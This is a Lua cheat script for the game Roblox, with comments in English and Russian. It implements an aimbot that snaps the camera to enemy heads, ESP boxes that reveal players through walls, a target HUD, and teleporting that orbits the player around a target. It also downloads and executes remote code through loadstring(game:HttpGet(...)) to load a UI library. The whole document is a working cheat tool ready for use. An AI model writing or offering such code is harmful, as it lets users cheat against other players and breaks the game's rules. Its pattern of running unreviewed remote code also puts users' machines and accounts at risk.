-- Load necessary services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Camera = workspace.CurrentCamera

-- Define colors
local Green = Color3.fromRGB(0, 255, 0)
local Red = Color3.fromRGB(255, 0, 0)

-- Aimbot settings
local player = Players.LocalPlayer
local aiming = false
local pcMod = false
local radius = 150
local useTeamCheck = true
local useWallCheck = true
local targetPart = "Head" -- Default target part (Head or Torso)
local lockOnTarget = false -- Lock onto target until death or out of radius
local currentTarget = nil -- Current locked target
local espEnabled = true -- Toggle for ESP functionality
local teleportEnabled = false -- Toggle for teleportation functionality
local rotationSpeed = 10 -- Скорость вращения (настраиваемая)
local verticalSpeedMultiplier = 2 -- Множитель скорости вертикального движения
local rotationRadius = 5 -- Радиус вращения (настраиваемый)
local verticalAmplitude = 3 -- Амплитуда вертикального движения над головой
local isRotating = false -- Флаг для управления вращением

-- ESP settings
local esp = {}

-- Target HUD settings
local hudVisible = false
local hudRect = nil
local hudHealthBar = nil
local hudAvatar = nil
local hudName = nil

-- Function to create a new drawing object
local function NewDrawing(className, properties)
    local drawing = Drawing.new(className)
    for property, value in pairs(properties) do
        drawing[property] = value
    end
    return drawing
end

-- Aimbot circle drawing
local drawing = NewDrawing("Circle", {
    Color = Color3.new(1, 0, 0),
    Thickness = 2,
    Radius = radius,
    Filled = false,
    Visible = true
})

-- Function to update circle position
local function updateCirclePosition()
    local screenSize = Camera.ViewportSize
    drawing.Position = Vector2.new(screenSize.X / 2, screenSize.Y / 2)
end

-- Изначально центрируем кружок
updateCirclePosition()

-- Target HUD initialization
local function initTargetHUD()
    hudRect = NewDrawing("Square", {
        Size = Vector2.new(200, 100),
        Position = Vector2.new(Camera.ViewportSize.X / 2 + 120, Camera.ViewportSize.Y / 2 - 50), -- Чуть правее центра
        Color = Color3.fromRGB(50, 50, 50),
        Filled = true,
        Visible = false,
        Thickness = 2
    })
    hudHealthBar = NewDrawing("Square", {
        Size = Vector2.new(180, 20),
        Position = Vector2.new(Camera.ViewportSize.X / 2 + 130, Camera.ViewportSize.Y / 2 + 20),
        Color = Green,
        Filled = true,
        Visible = false
    })
    hudAvatar = NewDrawing("Image", {
        Size = Vector2.new(60, 60),
        Position = Vector2.new(Camera.ViewportSize.X / 2 + 130, Camera.ViewportSize.Y / 2 - 40),
        Data = "",
        Visible = false
    })
    hudName = NewDrawing("Text", {
        Text = "",
        Size = 20,
        Center = true,
        Outline = true,
        Color = Color3.fromRGB(255, 255, 255),
        Position = Vector2.new(Camera.ViewportSize.X / 2 + 220, Camera.ViewportSize.Y / 2 - 10),
        Visible = false
    })
end

initTargetHUD()

-- Function to update Target HUD
local function updateTargetHUD()
    if currentTarget and currentTarget.Parent and currentTarget.Parent:FindFirstChild("Humanoid") and currentTarget.Parent.Humanoid.Health > 0 then
        local targetPlayer = Players:GetPlayerFromCharacter(currentTarget.Parent)
        local humanoid = currentTarget.Parent.Humanoid
        hudVisible = true
        hudRect.Visible = true
        hudHealthBar.Visible = true
        hudAvatar.Visible = true
        hudName.Visible = true

        -- Update health bar
        local healthPercent = humanoid.Health / humanoid.MaxHealth
        hudHealthBar.Size = Vector2.new(180 * healthPercent, 20)
        hudHealthBar.Color = Color3.fromRGB(255 * (1 - healthPercent), 255 * healthPercent, 0)

        -- Update avatar
        if targetPlayer then
            hudAvatar.Data = game:HttpGet("https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&userId=" .. targetPlayer.UserId)
        end

        -- Update name
        hudName.Text = targetPlayer and targetPlayer.Name or "Unknown"
    else
        hudVisible = false
        hudRect.Visible = false
        hudHealthBar.Visible = false
        hudAvatar.Visible = false
        hudName.Visible = false
    end
end

-- Function to check target visibility (WallCheck)
local function isTargetVisible(targetPosition)
    if not useWallCheck then
        return true
    end
    local origin = Camera.CFrame.Position
    local direction = (targetPosition - origin).Unit
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {player.Character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    local raycastResult = workspace:Raycast(origin, direction * (targetPosition - origin).Magnitude, raycastParams)

    if raycastResult then
        local hitPart = raycastResult.Instance
        local hitPlayer = Players:GetPlayerFromCharacter(hitPart.Parent)
        return hitPlayer ~= nil and hitPart.Parent == currentTarget.Parent
    end
    return false
end

-- Function to get the closest target in radius
local function getClosestTargetInRadius()
    local target = nil
    local shortestDistance = math.huge

    for _, playerModel in pairs(Players:GetPlayers()) do
        if playerModel ~= player and playerModel.Character then
            local character = playerModel.Character
            local humanoid = character:FindFirstChild("Humanoid")
            local targetPartInstance = character:FindFirstChild(targetPart)
            if humanoid and targetPartInstance and humanoid.Health > 0 then
                -- Team check
                if not useTeamCheck or (player.Team and playerModel.Team ~= player.Team) then
                    local screenPos, onScreen = Camera:WorldToViewportPoint(targetPartInstance.Position)
                    local distanceToCenter = (Vector2.new(screenPos.X, screenPos.Y) - drawing.Position).Magnitude
                    if onScreen and distanceToCenter <= radius and isTargetVisible(targetPartInstance.Position) then
                        local distance = (targetPartInstance.Position - Camera.CFrame.Position).Magnitude
                        if distance < shortestDistance then
                            shortestDistance = distance
                            target = targetPartInstance
                        end
                    end
                end
            end
        end
    end

    return target
end

-- Function to aim at the target
local function aimAtTarget()
    if currentTarget and currentTarget.Parent and currentTarget.Parent:FindFirstChild("Humanoid") and currentTarget.Parent.Humanoid.Health > 0 then
        local screenPos, onScreen = Camera:WorldToViewportPoint(currentTarget.Position)
        local distanceToCenter = (Vector2.new(screenPos.X, screenPos.Y) - drawing.Position).Magnitude
        if onScreen and distanceToCenter <= radius and isTargetVisible(currentTarget.Position) then
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, currentTarget.Position)
            drawing.Color = Green

            -- Teleport the player behind the target if enabled
            if teleportEnabled then
                local targetPosition = currentTarget.Position
                local directionToTarget = (targetPosition - Camera.CFrame.Position).Unit
                local behindTarget = targetPosition - directionToTarget * rotationRadius
                local character = player.Character or player.CharacterAdded:Wait()
                local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
                humanoidRootPart.CFrame = CFrame.lookAt(behindTarget, targetPosition) -- Смотрим на голову
                isRotating = true
            end
            return
        else
            currentTarget = nil
            isRotating = false
        end
    end

    -- Find a new target
    local target = getClosestTargetInRadius()
    if target then
        currentTarget = target
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, target.Position)
        drawing.Color = Green

        -- Teleport the player behind the target if enabled
        if teleportEnabled then
            local targetPosition = currentTarget.Position
            local directionToTarget = (targetPosition - Camera.CFrame.Position).Unit
            local behindTarget = targetPosition - directionToTarget * rotationRadius
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
            humanoidRootPart.CFrame = CFrame.lookAt(behindTarget, targetPosition) -- Смотрим на голову
            isRotating = true
        end
    else
        drawing.Color = Red
        currentTarget = nil
        isRotating = false
    end
end

-- Function to update the ESP
local function UpdateESP()
    if not espEnabled then
        for _, plr in pairs(esp) do
            plr.box.Visible = false
            plr.name.Visible = false
        end
        return
    end

    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health > 0 then
            local rootPart = plr.Character.HumanoidRootPart
            local color = plr.TeamColor == player.TeamColor and Green or Red

            if not esp[plr] then
                esp[plr] = {
                    box = NewDrawing("Square", {
                        Thickness = 2,
                        Color = color,
                        Filled = false
                    }),
                    name = NewDrawing("Text", {
                        Text = plr.Name,
                        Size = 14,
                        Center = true,
                        Outline = true,
                        Color = color
                    })
                }
            else
                esp[plr].box.Color = color
                esp[plr].name.Color = color
            end

            local vector, onScreen = Camera:WorldToViewportPoint(rootPart.Position)
            if onScreen then
                local size = 2000 / vector.Z
                esp[plr].box.Size = Vector2.new(size, size)
                esp[plr].box.Position = Vector2.new(vector.X - size / 2, vector.Y - size / 2)
                esp[plr].box.Visible = true
                esp[plr].name.Position = Vector2.new(vector.X, vector.Y - size / 2 - 20)
                esp[plr].name.Visible = true
            else
                esp[plr].box.Visible = false
                esp[plr].name.Visible = false
            end
        end
    end

    -- Очистка ESP для несуществующих игроков
    for plr, data in pairs(esp) do
        if not Players:GetPlayerByUserId(plr.UserId) then
            data.box:Remove()
            data.name:Remove()
            esp[plr] = nil
        end
    end
end

-- Load Rayfield UI
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "Aimbot Interface",
    LoadingTitle = "Loading Aimbot...",
    LoadingSubtitle = "by Sirius",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = nil,
        FileName = "AimbotConfig"
    },
    Discord = {
        Enabled = false,
        Invite = "noinvitelink",
        RememberJoins = true
    },
    KeySystem = false
})

local AimbotTab = Window:CreateTab("Aimbot", 4483362458)

local aimbotToggle = AimbotTab:CreateToggle({
    Name = "Enable Aimbot",
    CurrentValue = false,
    Flag = "AimbotToggle",
    Callback = function(Value)
        aiming = Value
        if not Value then
            drawing.Color = Red
            currentTarget = nil
            isRotating = false
        end
    end
})

local radiusSlider = AimbotTab:CreateSlider({
    Name = "Aimbot Radius",
    Range = {1, 500},
    Increment = 1,
    CurrentValue = radius,
    Flag = "AimbotRadius",
    Callback = function(Value)
        radius = Value
        drawing.Radius = radius
    end
})

local teamCheckToggle = AimbotTab:CreateToggle({
    Name = "Team Check",
    CurrentValue = useTeamCheck,
    Flag = "TeamCheckToggle",
    Callback = function(Value)
        useTeamCheck = Value
    end
})

local wallCheckToggle = AimbotTab:CreateToggle({
    Name = "Wall Check",
    CurrentValue = useWallCheck,
    Flag = "WallCheckToggle",
    Callback = function(Value)
        useWallCheck = Value
    end
})

local targetPartDropdown = AimbotTab:CreateDropdown({
    Name = "Target Part",
    Options = {"Head", "Torso"},
    CurrentOption = targetPart,
    Flag = "TargetPartDropdown",
    Callback = function(Option)
        targetPart = Option
        currentTarget = nil
    end
})

local lockOnToggle = AimbotTab:CreateToggle({
    Name = "Lock On Target",
    CurrentValue = lockOnTarget,
    Flag = "LockOnToggle",
    Callback = function(Value)
        lockOnTarget = Value
        if not Value then
            currentTarget = nil
            isRotating = false
        end
    end
})

local pcModToggle = AimbotTab:CreateToggle({
    Name = "PC Mod",
    CurrentValue = pcMod,
    Flag = "PcModToggle",
    Callback = function(Value)
        pcMod = Value
    end
})

local espToggle = AimbotTab:CreateToggle({
    Name = "Enable ESP",
    CurrentValue = espEnabled,
    Flag = "EspToggle",
    Callback = function(Value)
        espEnabled = Value
    end
})

local teleportToggle = AimbotTab:CreateToggle({
    Name = "Enable Teleport",
    CurrentValue = teleportEnabled,
    Flag = "TeleportToggle",
    Callback = function(Value)
        teleportEnabled = Value
        if not Value then
            isRotating = false
        end
    end
})

-- Handle character respawn
player.CharacterAdded:Connect(function(character)
    currentTarget = nil
    isRotating = false
end)

-- Очистка ESP при выходе игрока с сервера
Players.PlayerRemoving:Connect(function(plr)
    if esp[plr] then
        esp[plr].box:Remove()
        esp[plr].name:Remove()
        esp[plr] = nil
    end
end)

-- Main loop for aiming, rotating, and ESP
RunService.RenderStepped:Connect(function(deltaTime)
    updateCirclePosition()

    if pcMod then
        if UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
            aiming = true
            aimAtTarget()
        else
            aiming = false
            drawing.Color = Red
            currentTarget = nil
            isRotating = false
        end
    else
        if aiming then
            aimAtTarget()
        else
            drawing.Color = Red
            currentTarget = nil
            isRotating = false
        end
    end

    -- Вращение вокруг головы цели с вертикальным движением
    if isRotating and currentTarget and teleportEnabled then
        local character = player.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            local humanoidRootPart = character.HumanoidRootPart
            local targetPosition = currentTarget.Position
            local angle = tick() * rotationSpeed
            local verticalAngle = tick() * rotationSpeed * verticalSpeedMultiplier
            local horizontalOffset = Vector3.new(math.sin(angle), 0, math.cos(angle)) * rotationRadius
            local verticalOffset = Vector3.new(0, math.abs(math.sin(verticalAngle)) * verticalAmplitude, 0)
            local newPosition = targetPosition + horizontalOffset + verticalOffset
            humanoidRootPart.CFrame = CFrame.lookAt(newPosition, targetPosition)
        end
    end

    UpdateESP()
    updateTargetHUD()
end)
